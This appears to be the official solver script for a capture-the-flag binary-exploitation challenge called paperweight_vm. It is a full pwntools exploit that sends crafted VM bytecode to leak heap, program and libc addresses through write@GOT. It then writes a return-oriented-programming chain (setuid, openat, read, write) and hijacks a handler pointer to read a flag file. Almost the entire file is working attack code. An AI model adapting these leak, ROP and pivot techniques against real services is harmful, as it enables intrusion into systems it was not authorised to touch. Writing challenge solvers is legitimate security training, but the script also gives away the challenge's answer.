#!/usr/bin/env python3
"""Official single-connection exploit for paperweight_vm."""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import struct
import sys
from pathlib import Path

from pwn import ELF, context, remote

sys.dont_write_bytecode = True

from vm_asm import HOME, INPUT, LOAD, PRINT, STORE, TRIGGER, Program


HERE = Path(__file__).resolve().parent
BINARY = HERE / "paperweight_vm"
LIBC = HERE / "libc.so.6"
OFFSETS = HERE / "offsets.json"
MASK64 = (1 << 64) - 1
RELEASE_BINARY_SHA256 = (
    "13b3bde3df0db05c6cc7249595f729d4f9796e4dad627a6956d6d7ecd28cbbce"
)


def find_gadget(elf: ELF, encoding: bytes, name: str) -> int:
    address = next(elf.search(encoding, executable=True), None)
    if address is None:
        raise RuntimeError(f"required gadget is absent: {name}")
    return address


def qwords(data: bytes) -> list[int]:
    padded = data + b"\0" * ((-len(data)) % 8)
    return [struct.unpack("<Q", padded[index : index + 8])[0]
            for index in range(0, len(padded), 8)]


def make_program(meta: dict[str, int], chain_words: int,
                 path_words: int, chain_start: int, path_start: int) -> bytes:
    program = Program()

    # Stage 1: disclose one heap handler and the immutable tape pointer.
    program.emit(LOAD, offset=meta["handler_zero_index"])
    program.emit(PRINT)
    program.emit(LOAD, offset=meta["tape_origin_index"])
    program.emit(PRINT)

    # Stage 2: rebase the tape window onto write@GOT and disclose libc.
    program.emit(INPUT)
    program.emit(STORE, offset=meta["tape_base_index"])
    program.emit(LOAD, offset=0)
    program.emit(PRINT)
    program.emit(HOME)

    # Stage 3: receive and materialize the computed ROP stack on the real tape.
    for index in range(chain_words):
        program.emit(INPUT)
        program.emit(STORE, offset=chain_start + index)
    for index in range(path_words):
        program.emit(INPUT)
        program.emit(STORE, offset=path_start + index)

    # Stage 4: replace only the dormant handler, then dispatch through it.
    program.emit(INPUT)
    program.emit(STORE, offset=meta["trigger_handler_index"])
    program.emit(TRIGGER)
    return program.encode()


def build_chain(meta: dict[str, int], pie_base: int, libc_base: int,
                tape: int, path_start: int, buffer_start: int) -> list[int]:
    libc = ELF(str(LIBC), checksec=False)
    pop_rax = libc_base + find_gadget(libc, b"\x58\xc3", "pop rax; ret")
    pop_rdi = libc_base + find_gadget(libc, b"\x5f\xc3", "pop rdi; ret")
    pop_rsi = libc_base + find_gadget(libc, b"\x5e\xc3", "pop rsi; ret")
    syscall_ret = libc_base + find_gadget(
        libc, b"\x0f\x05\xc3", "syscall; ret"
    )
    pop_rdx = pie_base + meta["pop_rdx_offset"]
    path_address = tape + path_start * 8
    buffer_address = tape + buffer_start * 8

    chain: list[int] = []

    def syscall(number: int, rdi: int, rsi: int | None = None,
                rdx: int | None = None) -> None:
        chain.extend([pop_rax, number, pop_rdi, rdi & MASK64])
        if rsi is not None:
            chain.extend([pop_rsi, rsi & MASK64])
        if rdx is not None:
            chain.extend([pop_rdx, rdx & MASK64])
        chain.append(syscall_ret)

    # The only non-ORW transition admitted by seccomp is setuid(PWN_UID).
    syscall(105, meta["pwn_uid"])
    syscall(257, -100, path_address, 0)  # openat(AT_FDCWD, path, O_RDONLY)
    syscall(0, 3, buffer_address, 0x80)  # deterministic first free descriptor
    syscall(1, 1, buffer_address, 0x80)
    syscall(60, 0)
    return chain


def receive_hex(io) -> int:
    line = io.recvline(timeout=5)
    if not line or not re.fullmatch(rb"0x[0-9a-f]{16}\n", line):
        raise RuntimeError(f"expected VM hex word, got {line!r}")
    return int(line, 16)


def send_word(io, value: int) -> None:
    io.recvuntil(b"word> ", timeout=5)
    io.send(struct.pack("<Q", value & MASK64))


def exploit(io, flag_path: bytes) -> bytes:
    context.arch = "amd64"
    context.log_level = "error"
    binary_digest = hashlib.sha256(BINARY.read_bytes()).hexdigest()
    if binary_digest != RELEASE_BINARY_SHA256:
        raise RuntimeError(
            "solver metadata does not match this challenge binary: "
            f"{binary_digest}"
        )
    meta = json.loads(OFFSETS.read_text(encoding="utf-8"))
    elf = ELF(str(BINARY), checksec=False)
    libc = ELF(str(LIBC), checksec=False)

    path_data = flag_path + b"\0"
    path_values = qwords(path_data)

    # The chain has a fixed 37-word shape; addresses are supplied interactively.
    chain_word_count = 37
    chain_start = 0
    path_start = 96
    buffer_start = 128
    program = make_program(meta, chain_word_count, len(path_values),
                           chain_start, path_start)
    if len(program) // 16 > 192:
        raise RuntimeError("official bytecode exceeds the VM instruction budget")

    io.recvuntil(b"<16-byte instructions>\n", timeout=5)
    io.send(struct.pack("<I", len(program)) + program)

    handler_leak = receive_hex(io)
    tape = receive_hex(io)
    pie_base = handler_leak - meta["handler_leak_offset"]
    write_got = pie_base + elf.got["write"]
    send_word(io, write_got)
    write_leak = receive_hex(io)
    libc_base = write_leak - libc.symbols["write"]

    chain = build_chain(meta, pie_base, libc_base, tape,
                        path_start, buffer_start)
    if len(chain) != chain_word_count:
        raise RuntimeError(f"chain shape changed: {len(chain)} words")
    for word in chain:
        send_word(io, word)
    for word in path_values:
        send_word(io, word)
    send_word(io, pie_base + meta["pivot_offset"])

    output = io.recvall(timeout=5)
    match = re.search(rb"(?:kctf\{flag\}|KCTF\{[0-9a-f]{64}\})", output)
    if match is None:
        raise RuntimeError(f"flag not found in final output: {output!r}")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description="official paperweight_vm solver")
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    arguments = parser.parse_args()

    context.log_level = "error"
    io = remote(arguments.host, arguments.port)
    print(exploit(io, b"/home/pwn/flag").decode())


if __name__ == "__main__":
    main()
